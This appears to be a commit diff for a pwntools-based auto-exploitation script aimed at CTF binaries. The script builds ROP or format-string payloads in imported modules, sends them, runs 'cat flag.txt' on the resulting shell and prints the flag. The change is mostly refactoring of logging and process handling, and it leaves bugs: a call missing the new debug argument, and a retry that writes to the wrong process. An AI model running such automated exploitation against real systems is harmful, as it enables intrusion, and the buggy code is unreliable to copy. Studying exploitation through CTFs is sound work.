@@ -6,8 +6,9 @@ import Fart_FMT
 import Fart_ROP
 import time
 import traceback
-import threading
+from multiprocessing import Process
 import os
+from Print import Print
 
 logging.getLogger('pwnlib').setLevel(logging.WARNING)
 
@@ -33,6 +34,8 @@ continue
 '''
 context.terminal = ["tmux", "splitw", "-h"]
 
+fart_print = Print()
+
 def start(binary):
     e = context.binary = ELF(binary)
     if args.GDB:
@@ -50,11 +53,14 @@ def exploit(analyize):
         try:
             send(rop.build_exploit(), p, analyze)
         except EOFError:
-            p = process(binary)
+            p2 = process(binary)
             send(rop.build_exploit(failed=True), p, analyze)
+            p2.close()
     else:
         fmt = Fart_FMT.FMT(analyze)
         send(fmt.build_exploit(), p, analyze)
+
+    p.close()
 
 def send(payload, p, analyze):
 
@@ -64,22 +70,24 @@ def send(payload, p, analyze):
             sleep(0.1)
             p.sendline(b"cat flag.txt")
         p.recvuntil(b"flag")
-        print(fire + " flag" + p.recvuntil(b"}").decode("utf-8") + " " + fire)
+        fart_print.success(f"{analyze.binary}: fart{p.recvuntil(b'}').decode('utf-8')}")
 
-
-def __libc_fart_main(binary):
+def __libc_fart_main(binary, debug):
     global analyze
     try: 
         analyze = Analyze(binary)
         exploit(analyze)
     except Exception as e:
-        print("[-] Well this stinks! We've encountered an exception we don't know how to handle!")
-        print("Exception Type: " + str(e.__class__.__name__))
-        print("Exception Message: " + str(e))
-        #print(traceback.format_exc())
+        fart_print.warning("Well this stinks! We've encountered an exception we don't know how to handle!")
+        if debug:
+            fart_print.error("Exception Type: " + str(e.__class__.__name__))
+            fart_print.error("Exception Message: " + str(e))
+            fart_print.error(traceback.format_exc())
 
 if __name__ == "__main__":
-    print(banner)
+    fart_print.green(banner)
+    
+    debug = args.DBG
     
     bins_dir = args.DIR
     bins = []
@@ -89,9 +97,9 @@ if __name__ == "__main__":
             bins.append(bins_dir + "/" + binary)
     
         for binary in bins:
-            #thread = threading.Thread(target=__libc_fart_main, args=(binary,))
-            #thread.start()
-            __libc_fart_main(binary)
+            #proc = Process(target=__libc_fart_main, args=(binary,))
+            #proc.start()
+            __libc_fart_main(binary, debug)
     else:
         binary = args.BIN
         __libc_fart_main(binary)
